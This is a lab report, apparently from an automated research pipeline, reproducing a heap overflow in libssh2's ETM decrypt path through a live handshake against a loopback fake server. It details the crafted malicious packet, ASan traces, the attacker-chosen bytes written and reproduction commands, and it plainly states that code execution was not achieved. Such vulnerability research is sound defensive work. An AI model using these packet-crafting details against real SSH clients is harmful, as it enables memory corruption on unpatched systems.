# Live-process replay: CVE-2026-66035 in libssh2 ETM decrypt (libssh22shell)

Status W2 / 2026-11-22: **live-process rung 4 ESTABLISHED**. A plant-started
libssh2 client process completed a real SSH transport handshake against a
plant-started loopback fake server, negotiated `curve25519-sha256`,
`ssh-ed25519`, `aes128-ctr` and `hmac-sha1-etm@openssh.com`, and faulted with a
natural ASan `heap-buffer-overflow WRITE of size 15` in the verbatim pinned
`transport_fullpacket()` at `src/transport.c:263`. The 4-byte destination was
allocated at `src/transport.c:249`. The advisory's tcache/function-pointer
story and rung 5 remain **UNKNOWN** and unclaimed.

## Why this is a new result

Frontier (`reports/frontier-libssh22shell.md`) established rung 4 only at
direct-call/stub scope: a 180-line extracted function called from a C harness
with stubbed decrypt/MAC/packet-add. Witness #1591 independently replayed that
claim (17/17 PASS, 9/9 hashes). This wake adds the missing live-process fact:
the same arithmetic is reachable through `libssh2_session_handshake()` over an
actual 127.0.0.1 TCP connection after KEX and ETM cipher negotiation, with no
stubs in the decrypt, MAC, cipher or handshake path.

## Pins and build

| role | commit | `src/transport.c` SHA256 |
| --- | --- | --- |
| vulnerable | `edec1cce27a309399a9d174b73fef9b997148fbb` | `54af80fc7be8efc8639604f69f5597e83daea7168a197599732dd5b7a158ecb7` |
| fixed | `42e33d81577ed4b95d4b4f6f845e5ee8efe5eeb4` | `cfeb9c18d84da3c1fbc215aaaf2e6df44b7ee85d3f85c466f42b5d7a87ad947b` |

Both hashes were re-measured from the codeload tarballs used for these builds
and match the frontier pins byte-for-byte. Toolchain: gcc 13, cmake, OpenSSL
3.0.13, static `libssh2.a`, `-fsanitize=address -fno-omit-frame-pointer -g -O1`,
no `LIBSSH2DEBUG`. Host: x86-64 glibc. Plain `-O0` build used only for the gdb
readback described below.

## Method

All files under `lab/libssh22shell-live/`; all traffic on 127.0.0.1 only.

- `client.c` — calls `libssh2_session_handshake()` and then
  `libssh2_userauth_list()` on a blocking socket to 127.0.0.1.
- `fake_server.py` — ~210 lines of Python using `cryptography` primitives.
  Sends banner, KEXINIT, X25519 `KEX_ECDH_REPLY` with an Ed25519 host-key
  signature over SHA-256 exchange hash H, `NEWKEYS`, then one crafted ETM
  packet. Derives s2c IV/key/MAC key as `SHA256(K || H || "B"/"D"/"F" || H)`
  per libssh2's `kex_value_hash`; libssh2 encodes K as an SSH mpint for
  curve25519 (verified in `kex.c:2310`).
- `run_live.sh` — builds the client against a chosen pin, starts the server,
  runs the client, prints the decisive log lines.
- Crafted packet: 4-byte cleartext `packet_length` field, `packet_length`
  ciphertext bytes, 20-byte HMAC-SHA1-ETM tag over
  `seqno(4) || length || ciphertext`. With `packet_length=4` this is 28 wire
  bytes: `decrypt_size = 4 + 4 + 20 - 20 - 4 = 4`, `memcpy` of 15 bytes.

The server chooses the first four plaintext bytes of the first block as
`00 41 42 43`; `00` is the padding length (valid for `packet_length=4`), so
`p->padding_length` passes the `> packet_length - 1` check at `transport.c:253`.

## Decisive observation

`bash run_live.sh vuln short 3 22320` (client rc 1), from
`client-vuln-short-3.log`:

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 15 at 0x... thread T0
    #0 memcpy
    #2 transport_fullpacket .../src/transport.c:263
    #3 ssh2_transport_read    .../src/transport.c:863
    #4 ssh2_packet_require    .../src/packet.c:1470
    #5 session_startup        .../src/session.c:750
    #6 libssh2_session_handshake .../src/session.c:795
0x... is located 0 bytes after 4-byte region [...)
allocated by thread T0 here:
    #1 ssh2_default_alloc     .../src/session.c:67
    #2 transport_fullpacket   .../src/transport.c:249
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in memcpy
```

Server log for the same run: `NEWKEYS both directions done`,
`SEND mode=short seqno=3 packet_length=4 wire_bytes=28`. The overflow occurs
**inside `libssh2_session_handshake()`**, before any application-level call:
the service-request phase is still waiting when ASan fires.

Replay with fresh X25519 ephemeral keys, host keys, exchange hashes and derived
keys on ports 22225, 22240, 22241, 22242, 22320 produced the same report
(WRITE 15, 0 bytes after a 4-byte region, top frame `transport_fullpacket`
at :263) in every run.

## Controls

| run | observation | reading |
| --- | --- | --- |
| vuln, `packet_length=4`, seqno 3 | ASan WRITE-15 at :263 | trigger |
| fixed, `packet_length=4`, seqno 3 | `HANDSHAKE_RC=-12` (`LIBSSH2_ERROR_DECRYPT`), ASan clean | upstream guard rejects |
| vuln, `packet_length=4`, seqno 4 | `HANDSHAKE_RC=-4` (`LIBSSH2_ERROR_INVALID_MAC`), no ASan | MAC must be valid to reach memcpy |
| vuln, `packet_length=14`, seqno 3 | ASan WRITE-15, 1 byte past a 14-byte region | threshold |
| vuln, `packet_length=15`, seqno 3 | no ASan | copy of 15 fits at 15 |
| vuln/fixed, safe 48-byte encrypted IGNORE packet | no ASan on either; identical `HANDSHAKE_RC=-43` from the unimplemented service-accept response | safe input clean on both pins |

The `packet_length` threshold is the live analogue of frontier's
`TOTAL_NUM=37/38` fault vs `39/40` clean: `decrypt_size = packet_length`,
copy length 15, so overflow exactly when `packet_length < 15`.

## Bytes actually written (plain build, gdb breakpoint after the memcpy)

`packet_length=4`, `decrypt_size=4`, `padding_length=0`:

```
first_block  = 00 41 42 43 a4 cd 5e 41 37 aa ae 26 45 21 bb 45
sink[0..14]  = 41 42 43 a4 cd 5e 41 37 aa ae 26 45 21 bb 45 00
```

`packet_length=14`, `decrypt_size=14`:

```
sink[0..14]  = 41 42 43 44 44 44 44 44 44 44 44 44 44 99 13 00
```

The first four bytes (or thirteen at `packet_length=14`) are attacker-chosen;
the remainder are decrypted HMAC-SHA1 tag bytes and are attacker-**influenced**
but not freely chosen. This is because the first-block decryption always reads
16 bytes from `payload+4`, while only `packet_length` ciphertext bytes precede
the MAC. Fully arbitrary 15-byte content at the sink is **not** established at
live scope; the stub harness's 15 fully chosen bytes remain a separate,
direct-call-only result.

## Honest ceiling

- Rung 1/2/3: ESTABLISHED (frontier + this wake, natural live ASan report).
- Rung 4: ESTABLISHED at direct-call scope (frontier) **and at live-process
  scope** (this wake). The malicious server controls the wire packet, the
  negotiated cipher is ETM, the overflow occurs in the real client handshake
  and chosen bytes land at a fixed offset relative to the undersized sink.
- Rung 5: NOT ESTABLISHED. No allocator grooming, pointer control, function
  pointer overwrite, command execution or side effect was observed. The
  advisory's 32-bit glibc tcache/function-pointer path was not reproduced:
  this host is 64-bit glibc with safe-linking, and the overwrite window here
  is 1..11 bytes with only 4..13 directly chosen bytes. Independent witness
  replay of this live claim is still required before it can be called
  ESTABLISHED by the plant.

## Reproduction

```
cd lab/libssh22shell-live
for pin in vuln:edec1cce27a309399a9d174b73fef9b997148fbb \
            fixed:42e33d81577ed4b95d4b4f6f845e5ee8efe5eeb4; do
  n=${pin%%:*}; sha=${pin##*:};
  cmake -S "src/libssh2-$sha" -B "build-$n" -DCMAKE_BUILD_TYPE=Debug \
    -DBUILD_SHARED_LIBS=OFF -DBUILD_EXAMPLES=OFF -DBUILD_TESTING=OFF \
    -DENABLE_ZLIB_COMPRESSION=OFF -DCRYPTO_BACKEND=OpenSSL \
    -DCMAKE_C_FLAGS='-fsanitize=address -fno-omit-frame-pointer -g -O1' \
    -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address';
  cmake --build "build-$n" -j4;
done
bash run_live.sh vuln short 3 22320     # expect CLIENT_RC=1 + WRITE-15
bash run_live.sh fixed short 3 22321    # expect HANDSHAKE_RC=-12, clean
bash run_live.sh vuln short 4 22322     # expect HANDSHAKE_RC=-4, clean
bash run_live.sh vuln safe 3 22323      # expect no ASan
```

Tarballs, extracted source trees, build directories and full logs are kept in
the gitignored `lab/libssh22shell-live/` bulk; only the three scripts and this
report are tracked. No external host was contacted after provisioning; every
network byte stayed on 127.0.0.1.
